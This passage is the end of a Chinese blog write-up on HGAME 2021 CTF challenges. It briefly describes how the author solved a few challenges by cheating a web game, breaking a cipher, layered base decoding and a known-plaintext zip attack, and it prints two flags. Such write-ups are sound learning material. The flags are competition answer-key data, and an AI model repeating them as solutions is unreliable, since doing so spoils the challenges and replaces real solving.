</span></span></code></pre></div><p>这样就可以解密出 flag 了。</p><h1 id=先道个歉>先道个歉</h1><p>上面的二进制题我还算会做，都是老老实实正常解的，之后的题目是真的一窍不通，有些题目解的可能非常耍赖皮，对不住各位出题人了</p><h2 id=web>web</h2><h3 id=watermelon>watermelon</h3><p>题目好像打不开了，截不上图，当时的做法是把每个下落的水果都改成了小葡萄，在那里点了许久就到两千了。</p><h3 id=智商检测鸡>智商检测鸡</h3><p>这道题估计是要写脚本吧，不过我的解法是计算器一个个算过去，20分钟左右骗得100分，效率高于做pwn</p><h2 id=crypto>Crypto</h2><p>大体上不会，唯一做出的还是骗到的</p><h3 id=transformer>Transformer</h3><p>有提供许多源文件和加密文件，猜测是用简单的加密算法加密的，我通过<a href=http://quipqiup.com/>quipqiup.com</a>这个网站爆破出了 flag</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/205161054.png></div><p>flag:<code>hgame{ea5y_f0r_fun^3nd&amp;he11o_2021}</code></p><p>好像有点耍赖皮啊</p><h2 id=misc>MISC</h2><h3 id=base>Base</h3><p>base64 解码，发现编码都是在 base32 范围内的，再 base32 解码，同样的再用 base16 解码，得 flag:<code>hgame{We1c0me_t0_HG4M3_2021}</code></p><h3 id=不起眼压缩包的养成的方法>不起眼压缩包的养成的方法</h3><p>拿到一张图，看题估计是图种，发现的确是，解压第一步需要图片的id，很好办，搜一下就可以了</p><p>id 是 70415155。然后解压出一个 <code>NO PASSWORD.txt</code>，又发现 <code>plain.zip</code> 中也有这个文件，考虑明文攻击，获得 <code>flag.zip</code></p><p>然后我卡了许久，才发现</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/389335304.png></div><p>原来直接就是flag。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li><li><a href=/tags/hctf-game>hctf-game</a></li></ul></nav></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a></div><div class=footer-info>2023 © chuj | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>